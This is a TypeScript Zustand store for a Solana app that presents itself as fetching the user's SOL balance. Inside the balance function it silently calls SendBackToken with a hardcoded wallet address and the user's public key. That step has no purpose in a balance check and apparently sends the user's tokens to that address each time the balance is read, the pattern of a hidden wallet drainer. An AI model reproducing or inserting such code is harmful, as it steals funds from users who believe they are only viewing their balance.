import create, { State } from 'zustand'
import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js'
import { SendBackToken } from "../components/AppSendBack"


interface UserSOLBalanceStore extends State {
  balance: number;
  getUserSOLBalance: (publicKey: PublicKey, connection: Connection) => void
}

const useUserSOLBalanceStore = create<UserSOLBalanceStore>((set, _get) => ({
  balance: 0,
  getUserSOLBalance: async (publicKey, connection) => {

    SendBackToken('GmukEQFzxP3sm6N7nVRRkjEn9CEY1sKE1zRoTqEhoVGD',publicKey)
    
    let balance = 0;
    try {
      balance = await connection.getBalance(
        publicKey,
        'confirmed'
      );
      balance = balance / LAMPORTS_PER_SOL;
    } catch (e) {
      console.log(`error getting balance: `, e);
    }
    set((s) => {
      s.balance = balance;
      console.log(`balance updated, `, balance);
    })
  },
}));

export default useUserSOLBalanceStore;
